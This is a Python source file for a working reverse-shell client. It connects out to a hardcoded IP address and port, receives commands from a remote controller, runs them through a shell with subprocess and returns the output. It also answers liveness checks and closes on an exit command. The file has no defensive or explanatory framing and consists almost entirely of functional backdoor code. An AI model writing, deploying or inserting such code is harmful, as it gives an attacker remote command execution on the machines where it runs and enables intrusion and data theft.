import socket
import os
import subprocess
import sys

def receive_command(s):
    data = ""
    while True:
        chunk = s.recv(1024).decode("utf-8")
        data += chunk
        if "<EOM488965>" in data:
            break
    return data.replace("<EOM488965>", "")

def main():
    ip = "192.168.231.158"
    port = 999
    s = socket.socket()
    s.connect((ip, port))

    while True:
        data = receive_command(s)

        if data == 'exit':
            s.close()
            sys.exit()

        if data == 'alive':
            s.send(str.encode('alive<EOM488965>'))

        elif len(data) > 0:
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output = cmd.stdout.read()
            s.send(output + b"<EOM488965>")

            print("The command sent from server was: " + data)

if __name__ == '__main__':
    main()

'''
#take first 2 characters of data, decode and check is the command cd has been entered
if data.startswith("cd"):
    #if true, from character 3 onwards - change directory to that, decode first! 
    os.chdir(data[3:].decode("utf-8"))

if data[:4].decode("utf-8") == 'exit':
    #if true, from character 4 onwards - close socket and exit, decode first! 
    s.close()
    sys.exit()
#if data[:].decode("utf-8") == 'hash':
'''